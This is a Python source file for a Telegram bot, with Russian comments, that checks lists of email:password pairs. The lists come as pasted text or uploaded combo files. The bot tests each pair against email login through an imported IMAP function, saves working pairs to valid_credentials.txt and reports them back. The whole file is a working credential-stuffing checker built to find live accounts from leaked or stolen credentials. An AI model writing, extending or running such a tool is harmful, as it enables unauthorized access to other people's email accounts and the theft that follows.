import asyncio
import logging
import re
import traceback
from concurrent.futures import ThreadPoolExecutor

from aiogram import Bot, Dispatcher, types
from aiogram.types import ContentType
from aiogram.utils import executor

# Настройка бота
from imap import is_email_valid
from private_config import API_TOKEN

bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)

# Обработчик для текстовых сообщений
@dp.message_handler(commands='start')
async def send_welcome(message: types.Message):
    await message.reply("Send me emails and passwords separated by ' ', ':', ';', or '|'.")
# Обработчик для текстовых сообщений с учетными данными
@dp.message_handler(commands='cancel')
async def handle_credentials(message: types.Message):
    from_id=message.from_user.id
    if from_id in cancel_events:
        event:asyncio.Event=cancel_events[from_id]
        event.set()
    await message.reply('Canceled')
# Обработчик для текстовых сообщений с учетными данными
@dp.message_handler(content_types=ContentType.TEXT)
async def handle_credentials(message: types.Message):
    credentials = message.text.splitlines()
    cancel_event=asyncio.Event()
    cancel_events[message.from_user.id]=cancel_event
    await handle_lines(credentials, message,cancel_event)


# Переменная блокировки для предотвращения условий гонки
file_lock = asyncio.Lock()

cancel_events= {}
def is_possible_password(password):
    if not 6 <= len(password) <= 30:  # Обычно пароли длиной от 6 до 20 символов
        return False
    if not re.search(r"[A-Za-z]", password):  # Должна быть хотя бы одна буква
        return False
    # Дополнительные проверки можно добавить здесь
    return True

async def add_unique_credentials(email, password):
    async with file_lock:
        # Пытаемся прочитать существующие учетные данные
        try:
            with open('valid_credentials.txt', 'r+') as file:
                existing_credentials = file.read()
                # Проверяем, есть ли уже такая комбинация email:password
                if f'{email}:{password}' not in existing_credentials:
                    # Перемещаем указатель в конец файла перед записью
                    file.seek(0, 2)
                    file.write(f'{email}:{password}\n')
                    return True
        except FileNotFoundError:
            # Если файл не найден, создаем его и записываем учетные данные
            with open('valid_credentials.txt', 'w') as file:
                file.write(f'{email}:{password}\n')
                return True
    return False
# Асинхронная функция для обработки строк с учетными данными
async def handle_lines(credentials, message,cancel_event:asyncio.Event=None):
    status_message = await message.reply('Checking credentials... press /cancel for cancel')
    status_message_id = status_message.message_id
    loop = asyncio.get_running_loop()
    try:

        with ThreadPoolExecutor() as executor:
            tasks=[]
            for cred in credentials:
                if cancel_event:
                    if cancel_event.is_set():
                        return
                t=asyncio.create_task( check_and_answer(cred, executor, loop, message))
                tasks.append(t)

            results = await asyncio.gather(*tasks, return_exceptions=True)
    except:
        await message.reply(traceback.format_exc())


async def check_and_answer(cred, executor, loop, message):
    parts = re.split(r'[ :;]+', cred)
    email = parts[0]
    passwords = parts[1:]
    errors = []
    valid_found = False
    for password in passwords:
        if not is_possible_password(password):
            errors.append(f'Password format invalid for {password}.')
            continue
        try:
            is_valid = await loop.run_in_executor(executor, is_email_valid, email, password)
            if is_valid:
                credential_added = await add_unique_credentials(email, password)
                valid_found = True
                await message.reply(
                    text=f'\nValid credentials found and saved: <code>{email}</code>:<code>{password}</code>'
                    , parse_mode='HTML')

                break
        except Exception as e:  # Используем Exception для перехвата всех видов ошибок
            errors.append(f'Error with password <code>{password}</code>: <code>{str(e)}</code>')
    if not valid_found:
        error_text = '\n'.join(errors)
        await message.reply((f'No valid credentials found for {email}. Errors:\n{error_text}')[:4096], parse_mode='HTML')


# Регулярное выражение для проверки email
email_pattern = re.compile(r"^\S+@\S+\.\S+:")


# Обработчик для документов
@dp.message_handler(content_types=ContentType.DOCUMENT)
async def handle_document(message: types.Message):
    document_id = message.document.file_id
    file = await bot.get_file(document_id)
    file_path = file.file_path
    contents = await bot.download_file(file_path)

    # Декодирование содержимого файла и разбиение по строкам
    credentials_raw = contents.read().decode('utf-8').splitlines()

    # Фильтрация строк и извлечение учетных данных
    credentials = []
    for line in credentials_raw:
        if email_pattern.match(line):
            credentials.append(line)
    cancel_event = asyncio.Event()
    cancel_events[message.from_user.id] = cancel_event
    await handle_lines(credentials, message,cancel_event)

if __name__ == '__main__':
    logging.basicConfig(level='DEBUG')
    # Запуск бота
    executor.start_polling(dp)
